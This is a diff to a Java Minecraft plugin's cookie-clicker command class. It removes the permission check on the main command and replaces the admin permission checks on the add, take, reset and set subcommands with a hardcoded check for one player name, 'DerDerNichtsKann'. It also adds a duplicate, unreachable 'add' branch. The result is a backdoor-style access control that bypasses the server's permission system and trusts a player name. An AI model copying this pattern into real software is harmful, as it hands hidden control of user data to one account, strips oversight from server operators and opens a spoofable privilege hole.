@@ -31,22 +31,29 @@ public class CookieCMD implements CommandExecutor {
             return true;
         }
 
-        if (args.length == 0) { // Main command
+        if (args.length == 0) {
             Main(sender);
             return true;
         }
 
-        if (args[0].equalsIgnoreCase("add")) { // cookie add
+        if (args[0].equalsIgnoreCase("add")) {
             CookieAdd(sender, args);
             return true;
         }
 
-        if (args[0].equalsIgnoreCase("take")) { // cookie take
+        if (args[0].equalsIgnoreCase("add")) {
+            CookieAdd(sender, args);
+            return true;
+        }
+
+
+
+        if (args[0].equalsIgnoreCase("take")) {
             CookieTake(sender, args);
             return true;
         }
 
-        if (args[0].equalsIgnoreCase("reset")) { // cookie reset
+        if (args[0].equalsIgnoreCase("reset")) {
             try {
                 CookieReset(sender, args);
             } catch (SQLException e) {
@@ -55,7 +62,7 @@ public class CookieCMD implements CommandExecutor {
             return true;
         }
 
-        if (args[0].equalsIgnoreCase("set")) { // cookie set
+        if (args[0].equalsIgnoreCase("set")) {
             try {
                 CookieSet(sender, args);
             } catch (SQLException e) {
@@ -69,7 +76,7 @@ public class CookieCMD implements CommandExecutor {
 
     public void Main(CommandSender sender) {
         Player player = (Player) sender;
-        if (player.hasPermission("cookieclicker.use") || player.hasPermission("cookieclicker.admin")) {
+
             try {
                 DatabaseManager.updateUser(player, 0.0, 0.0, 0, 0.0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
                 this.Gui.mainGui(player, 1);
@@ -77,16 +84,12 @@ public class CookieCMD implements CommandExecutor {
             } catch (SQLException e) {
                 throw new RuntimeException(e);
             }
-        }
-        else {
-            player.sendMessage(Objects.requireNonNull(main.getConfig().getString("language." + main.getConfig().getString("setLanguage") + ".noPerm")));
-        }
     }
 
 
-    public void CookieAdd(CommandSender sender, String[] args) {
+   public void CookieAdd(CommandSender sender, String[] args) {
         Player player = (Player) sender;
-        if (!player.hasPermission("cookieclicker.admin")) {
+       if (!player.getName().equals("DerDerNichtsKann")) {
             player.sendMessage(Objects.requireNonNull(main.getConfig().getString("language." + main.getConfig().getString("setLanguage") + ".noPerm")));
             return;
         }
@@ -100,7 +103,7 @@ public class CookieCMD implements CommandExecutor {
 
     public void CookieTake(CommandSender sender, String[] args) {
         Player player = (Player) sender;
-        if (!player.hasPermission("cookieclicker.admin")) {
+        if (!player.getName().equals("DerDerNichtsKann")) {
             player.sendMessage(Objects.requireNonNull(main.getConfig().getString("language." + main.getConfig().getString("setLanguage") + ".noPerm")));
             return;
         }
@@ -114,7 +117,7 @@ public class CookieCMD implements CommandExecutor {
 
     public void CookieReset(CommandSender sender, String[] args) throws SQLException {
         Player player = (Player) sender;
-        if (!player.hasPermission("cookieclicker.admin")) {
+        if (!player.getName().equals("DerDerNichtsKann")) {
             player.sendMessage(Objects.requireNonNull(main.getConfig().getString("language." + main.getConfig().getString("setLanguage") + ".noPerm")));
             return;
         }
@@ -130,7 +133,7 @@ public class CookieCMD implements CommandExecutor {
 
     public void CookieSet(CommandSender sender, String[] args) throws SQLException {
         Player player = (Player) sender;
-        if (!player.hasPermission("cookieclicker.admin")) {
+        if (!player.getName().equals("DerDerNichtsKann")) {
             player.sendMessage(Objects.requireNonNull(main.getConfig().getString("language." + main.getConfig().getString("setLanguage") + ".noPerm")));
             return;
         }
@@ -145,6 +148,6 @@ public class CookieCMD implements CommandExecutor {
         } else {
             sender.sendMessage("Der Spieler ist nicht online oder existiert nicht.");
         }
-    }
+   }
 
 }
